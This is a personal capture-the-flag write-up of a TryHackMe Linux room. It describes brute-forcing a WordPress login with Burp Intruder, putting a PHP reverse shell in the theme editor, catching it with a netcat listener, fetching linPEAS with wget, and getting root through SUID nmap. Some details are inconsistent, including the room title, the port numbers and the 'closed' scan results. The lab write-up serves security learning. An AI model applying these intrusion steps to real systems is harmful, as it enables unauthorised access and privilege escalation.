# RootMe

**Platform:** TryHackMe  
**Difficulty:** Medium
**OS:** Linux
**Category:** Web / PrivEsc / Enumeration  
**Date Completed:** 09-Feb-2026  -  12-Feb-2026

## 🔍Recon
### Nmap Scan
PORT    STATE  SERVICE

22/tcp  closed ssh

80/tcp  closed http

443/tcp closed https



### Gobuster
![](attachments/Pasted%20image%2020260210193351.png)

#### Observations
`robots.txt` might contain some information.
`/admin` brings me to `admin/index.html` which appears buggy and keeps refreshing
`/atom` downloads a file with a `.atom` extension
`/login.php` might be a place for brute forcing
most of the other directories are forbidden as I do not have permission

## 💥Exploitation 
I start by examining page source and also the `robots.txt` file mentioned earlier.

In `robots.txt` the following is found
```
User-agent: *
fsocity.dic
key-1-of-3.txt
```

`fsocity.dic` seems to be a dictionary of random words, however `key-1-of-3.txt` contains the first flag.

`fsocity.dic` might contain a password that can be used to login through SSH or the wordpress login. 



On the `wp-login.php` page, the following is shown, I tried `test` as both username and password and the error popped up. I may be able to test for a correct Username and Password using this error and the previous `fsocity.dic` file.

![](attachments/Pasted%20image%2020260210221515.png)


I start by capturing a login request with burp suite.
![](attachments/Pasted%20image%2020260210221525.png)

Then I send it to intruder and add the `log` position only as I want to find a valid username. I then set the payload using the fsocity.dic file from earlier.
![](attachments/Pasted%20image%2020260210222003.png)

Filtering by both Response received and length, I found some possible candidates:

mrrobot - high response received
Elliot - High Length

I tried Elliot on the login page with a test password and seems that Elliot is a valid username.
![](attachments/Pasted%20image%2020260210223033.png)

However it does not seem that mrrobot is valid, I will keep this in mind as this may be a SSH username instead.

Now that I have a username, `Elliot`. I used the same steps but for the password field.


I added the position, remembering to change `log` as Elliot and put the previous `fsocity.dic` as the payload.

![](attachments/Pasted%20image%2020260210223404.png)
I got stuck here so I watched the [video](#Walkthrough) on the TryHackMe website, it seems that I was correct on the method but going through the wordlist is going to take a very long time since the answer was at the bottom of the `fsocity.dic` wordlist, `ER28-0652`.

I then login with the credentials, `Elliot` and `ER28-0652` 

Now that I have access to the full WordPress site, I can then put a php reverse shell onto the site and when entered, I can then get a reverse shell.

I start a netcat listener
`rlwrap nc -vlnp 53`

rlwrap enables functions such as tab completion and arrow key navigation.

In Wordpress, php code can be placed in Appearance/Editor in the Archive Template.

![](attachments/Pasted%20image%2020260212215407.png)

According to the [TryHackMe video](#Walkthrough), after updating the file to include the reverse shell simply use the web browser to activate it.

`http://10.49.179.63/wp-content/themes/twentyfifteen/archive.php`

![](attachments/Pasted%20image%2020260212220332.png)

Now that I have a shell, its time to find the 2nd and 3rd key, since I know the first key is called `key-1-of-3.txt`, I simply searched for the same name but for key 2 and 3.

` find / -name "key-*" 2>/dev/null
/ to find in all directories
`*` as a wildcard
`2>/dev/null` to redirect errors
![](attachments/Pasted%20image%2020260212220653.png)
![](attachments/Pasted%20image%2020260212220822.png)
I see the key 2 and also a password.raw-md5 file which might be useful later on.

However, when I try to `cat` the txt file I do not have permission.

So I start to do privilege escalation.
![](attachments/Pasted%20image%2020260212220759.png)

I used linPEAS to enumerate the victims machine

I start by hosting it on my machine using 
`sudo python3 -m http.server 9000`

Then, on the victims machine, 
`wget http://10.49.76.47:9009/linpeas.sh
don't forget to give it execute privileges
`chmod +x linpeas.sh`

Now I run 
`./linpeas.sh

An important thing linPEAS found was this
![](attachments/Pasted%20image%2020260212223920.png)

seems like nmap has its SUID bit set.

According to [Gtfobins](#GTFObins), I can run the following
```
nmap --interactive
!/bin/sh
```

Success
![](attachments/Pasted%20image%2020260212224542.png)

I first start by getting the password from `/home/robot/key-2-of-3.txt`

![](attachments/Pasted%20image%2020260212224745.png)

I also used `find / -name "key-3-of-3.txt"` to find the final key and successfully got it.

![](attachments/Pasted%20image%2020260212225104.png)
# Conclusion
rlwrap can be used to get a better shell on netcat
port 53 is a good port to use because it is rarely blocked
`rlwrap nc -lvnp 53`

`find .` to find in the current directory
`find /` to find in all
# References
#### Walkthrough
https://youtu.be/BQ4xeeNAbaw

#### GTFObins
https://gtfobins.org/gtfobins/nmap/#shell